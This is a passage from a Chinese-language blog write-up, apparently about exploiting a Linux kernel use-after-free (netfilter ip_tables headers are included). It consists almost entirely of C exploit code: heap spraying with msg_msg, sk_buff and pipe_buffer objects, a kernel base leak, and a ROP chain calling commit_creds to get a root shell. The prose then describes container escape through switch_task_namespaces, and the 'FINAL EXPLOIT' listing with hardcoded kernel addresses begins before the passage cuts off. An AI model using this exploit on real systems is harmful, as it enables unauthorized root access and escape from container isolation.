class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/03/31/pwtTNfU3Xa1smzO.png" alt="image.png"></p><h2 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h2><h3 id="Step-VI-切换进程命名空间，完成容器逃逸"><a href="#Step-VI-切换进程命名空间，完成容器逃逸" class="headerlink" title="Step.VI 切换进程命名空间，完成容器逃逸"></a>Step.VI 切换进程命名空间，完成容器逃逸</h3><p>现在我们已经能够在内核空间进行 ROP 了，那么完成容器逃逸其实是顺水推舟的事情，容器常用的隔离手段是利用命名空间进行隔离，因此我们只需要在内核中将进程的命名空间切换为初始的全局命名空间 <code>init_nsproxy</code> 即可完成容器逃逸，执行<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可替换掉当前进程的命名空间</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>整合了容器逃逸后的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_PROXY 0xffffffff82a639a0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RSI_RET 0xffffffff811594bd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RAX_POP_RDI_RET 0xffffffff81159547</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810c7d40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810cfc90</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span 